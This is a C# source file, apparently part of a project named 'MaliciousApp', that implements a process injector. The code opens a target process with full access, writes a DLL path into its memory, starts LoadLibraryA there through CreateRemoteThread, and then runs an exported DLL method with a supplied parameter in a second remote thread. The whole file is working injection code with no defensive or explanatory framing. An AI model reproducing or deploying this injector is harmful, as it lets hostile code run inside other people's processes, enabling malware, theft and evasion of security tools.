using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MaliciousApp
{
    class Injector
    {

      
        public static IntPtr NetDLLIntoNetProcess(int processId, string dllPath, string methodToCall)
        {
            return NetDLLIntoNetProcess(processId, dllPath, methodToCall, null);
        }

        //neeed to improve this to accept any param
        //method to call in the dll needs to be exported (DLLExport) 
        public static IntPtr NetDLLIntoNetProcess(int processId, string dllPath, string methodToCall, string param)
        {
            byte[] dllPathB = Encoding.ASCII.GetBytes(dllPath);
            //write dll path to be loaded
            var processHandle = GetProcessHandle(processId);
            var allocatedSpace = AllocSpaceInProcess(processHandle, dllPathB.Length + 1);
            WriteDataInProcessSpace(processHandle, allocatedSpace, dllPathB);


            IntPtr loadLibrarythread = LoadLibraryThread(processHandle, allocatedSpace);


            IntPtr paramsPointer = IntPtr.Zero;


            //prepare params to be used when callig the dll method
            if (param != null)
            {
                byte[] paramB = Encoding.ASCII.GetBytes(param);
                paramsPointer = AllocSpaceInProcess(processHandle, paramB.Length);
                WriteDataInProcessSpace(processHandle, paramsPointer, paramB);
            }

            //load dll
            var dllPointer = LoadLibrary(dllPath);
            var methodPointer = AddressForMethodInDll(dllPointer, methodToCall);

            //call method in dll
            var executionPointer = ExecuteCodeAt(processHandle, methodPointer, paramsPointer);

            NativeMethods.CloseHandle(processHandle);

            return executionPointer;

        }


        private static IntPtr GetProcessHandle(int processId)
        {
            try
            {
                return NativeMethods.OpenProcess(0x1F0FFF, true, processId);
            }
            catch
            {
                throw new Exception("Coudl not get handle for process " + processId);
            }
        }

        private static IntPtr AllocSpaceInProcess(IntPtr handle, int size)
        {
            return NativeMethods.VirtualAllocEx(handle, IntPtr.Zero, size, 4096, 4);
        }

        private static IntPtr WriteDataInProcessSpace(IntPtr handle, IntPtr allocatedSpace, byte[] content)
        {
            IntPtr bytesWritten;
            NativeMethods.WriteProcessMemory(handle, allocatedSpace, content, (content.Length +1), out bytesWritten);
            return bytesWritten;
        }

        private static IntPtr ExecuteCodeAt(IntPtr handle, IntPtr position, IntPtr paramsPosition)
        {
            IntPtr bytesout;
            return NativeMethods.CreateRemoteThread(handle, IntPtr.Zero, 0, position, paramsPosition, 0, out bytesout);
        }

        private static IntPtr LoadLibrary(String dllPath)
        {
            return NativeMethods.LoadLibraryEx(dllPath, IntPtr.Zero, 1);
        }

        private static IntPtr AddressForMethodInDll(IntPtr libraryPointer, string methodToCall)
        {
            return NativeMethods.GetProcAddress(libraryPointer, methodToCall);
        }

        private static IntPtr LoadLibraryThread(IntPtr handle, IntPtr allocatedSpace)
        {
            IntPtr bytesout;
            IntPtr loadLibraryPtr = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            return NativeMethods.CreateRemoteThread(handle, (IntPtr)null, 0, loadLibraryPtr, allocatedSpace, 0, out bytesout);
        }

    }
}
